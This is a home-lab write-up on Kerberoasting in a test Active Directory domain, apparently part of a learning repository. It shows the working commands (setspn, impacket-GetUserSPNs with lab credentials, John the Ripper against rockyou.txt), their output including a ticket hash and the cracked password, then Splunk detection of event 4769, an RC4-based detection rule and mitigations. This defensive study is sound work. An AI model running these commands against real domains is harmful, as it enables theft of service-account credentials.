# Kerberoasting — Attack & Detection

**Attack #3 of 5** · [Back to overview](../README.md)

## What this attack is

Kerberoasting targets **service accounts**, accounts created not for a real person, but to run a service like a database or a web app. These accounts often have an SPN (Service Principal Name) attached, which tells Active Directory "this account provides a network service."

Here's the catch: **any normal, low-privilege domain user is allowed to request a Kerberos ticket for any account that has an SPN**, no special permissions needed. That ticket is encrypted using a hash derived from the service account's password. If that password is weak, an attacker can take the ticket away, crack it offline on their own machine, with no further contact with the network, and recover the service account's real password.

This is exactly why service accounts deserve stronger passwords than regular users: a normal employee's weak password only exposes their own account, but a weak service account password can be extracted by *anyone* who's already logged into the domain, even a brand new, low-privilege user.

For this lab, I set up an account called `svc_sql` (pretending to be a database service) with an SPN attached, specifically so I'd have something to Kerberoast.

## Setup: giving svc_sql an SPN

```
setspn -A MSSQLSvc/dc01.lab.local:1443 svc_sql
```

This registers the SPN `MSSQLSvc/dc01.lab.local:1443` against the `svc_sql` account, making it a valid Kerberoasting target.

## How I ran it

### Step 1: Request the ticket

Using one of my already-compromised regular user accounts (`pcaramel`, cracked earlier via password spraying), I asked Active Directory for a service ticket tied to `svc_sql`:

```
impacket-GetUserSPNs lab.local/pcaramel:'Welcome123!' -dc-ip 10.10.10.10 -request
```

```
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
MSSQLSvc/dc01.lab.local:1443  svc_sql            2026-10-11 13:53:29.378458  <never>

$krb5tgs$23$*svc_sql$LAB.LOCAL$lab.local/svc_sql*$ec2586ff66155689dd5afda6036cad72$edda864ac84a9311849e7693e0...
```

That long string starting with `$krb5tgs$23$` is the actual ticket hash, this is what gets taken away and cracked offline, away from any live monitoring.

![impacket-GetUserSPNs extracting the svc_sql ticket hash](../screenshots/20-getuserspns-extraction.png)

### Step 2: Crack it offline

I saved the hash into a file and ran it through **John the Ripper** against the `rockyou.txt` wordlist (a very large list of real, leaked passwords):

```
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
Password1!       (?)
1g 0:00:00:00 DONE
```

Cracked instantly, `svc_sql`'s password was `Password1!`, a password common enough to be near-instantly found in a leaked-password wordlist.

![John the Ripper cracking the hash in under a second](../screenshots/21-john-crack-result.png)

```
john --format=krb5tgs --show hash.txt
→ ?:Password1!
1 password hash cracked, 0 left
```

![Confirming the cracked password with --show](../screenshots/22-john-show-result.png)

## Checking the detection side

```
index=main host=DC01 source="WinEventLog:Security" EventCode=4769 Service_Name="svc_sql" earliest=-3h
```

Two matching events appeared, from two separate ticket requests I made during testing.

![Splunk search showing two EventCode 4769 entries for svc_sql](../screenshots/23-splunk-4769-list.png)

### Reading the full event

This is the clearest single piece of evidence in the whole lab so far, one event tells the entire story:

```
EventCode=4769
TaskCategory=Kerberos Service Ticket Operations

Account Information:
    Account Name:    pcaramel@LAB.LOCAL
    Account Domain:  LAB.LOCAL

Service Information:
    Service Name:    svc_sql
    Service ID:      S-1-5-21-1486222426-470616684-116730423-1114

Network Information:
    Client Address:  ::ffff:10.10.10.50

Additional Information:
    Ticket Encryption Type: 0x17
    Failure Code:           0x0
```

![Expanded 4769 event showing requester, target, and source IP](../screenshots/24-splunk-4769-full-event.png)
![Additional ticket information, showing Failure Code 0x0](../screenshots/25-splunk-4769-additional-info.png)

Breaking down why each field matters:

| Field | What it tells you |
|---|---|
| **Account Name: `pcaramel@LAB.LOCAL`** | The **requester**, who asked for the ticket. This is a normal user account, not an admin, which is exactly the point: anyone can do this |
| **Service Name: `svc_sql`** | The **target**, the service account whose ticket was requested |
| **Client Address: `::ffff:10.10.10.50`** | Where the request came from. `::ffff:` is just how an IPv4 address is written in IPv6 notation, the real address is `10.10.10.50`, my Kali machine |
| **Failure Code: `0x0`** | The request succeeded. This is normal for Kerberoasting, the ticket request itself isn't a failure of anything, it's a completely legitimate, allowed action. The attack happens *after*, when the ticket is cracked offline |
| **Ticket Encryption Type: `0x17`** | This is RC4 encryption, an older, weaker type. Service accounts using this encryption type are easier to crack than ones using newer AES encryption, worth flagging as its own finding below |

## Why this one event is so valuable

Unlike my earlier password spraying detection (where the `Source Workstation` field was blank), this event includes the **Client Address**, giving a complete chain: *who* (`pcaramel`), *what* (`svc_sql`), and *where from* (`10.10.10.50`). That's everything needed to start an incident response investigation from a single log line.

## What a real detection rule would look like

A single 4769 event for a service account isn't suspicious by itself, ticket requests happen constantly in a healthy domain. What would actually flag this as suspicious in a real environment:

- **Encryption type 0x17 (RC4) specifically.** Modern, properly configured domains mostly use AES. A 4769 event requesting RC4 is a known, well-documented Kerberoasting indicator, since attacker tooling (like Impacket) requests RC4 by default.
- **Multiple SPN ticket requests from one account in a short window.** A real Kerberoasting run targets every SPN account in the domain at once (not just one, like I did here), so volume is a strong signal.
- **A regular user account requesting tickets for several different service accounts.** Normal users don't have a reason to request service tickets manually, this access is handled automatically by applications as part of real authentication, not typed by a person.

## My finding

The encryption type (`0x17`/RC4) is genuinely the strongest single signal in this event, stronger than the account name or client address alone, since legitimate traffic can also show those, but legitimate services increasingly avoid RC4. In a real environment, a detection rule built around "4769 + RC4 encryption + a non-service account as the requester" would likely catch this with very few false positives.

## Takeaways

- Kerberoasting doesn't require any special privilege, it's a legitimate protocol feature being abused, which is exactly why it's hard to prevent outright and why detection (not just prevention) matters
- A single well-logged event, when it includes fields like Client Address, can be enough to fully reconstruct an attack: who, what, and where from
- The ticket's encryption type is a more reliable red flag than the request itself, since the request alone is completely normal Kerberos behavior
- Reducing this risk in a real environment usually means: strong, random service account passwords (ideally managed by a tool, not memorized), and disabling RC4 where possible

---
**Previous:** [Password Spraying — Attack & Detection](03-password-spraying.md)
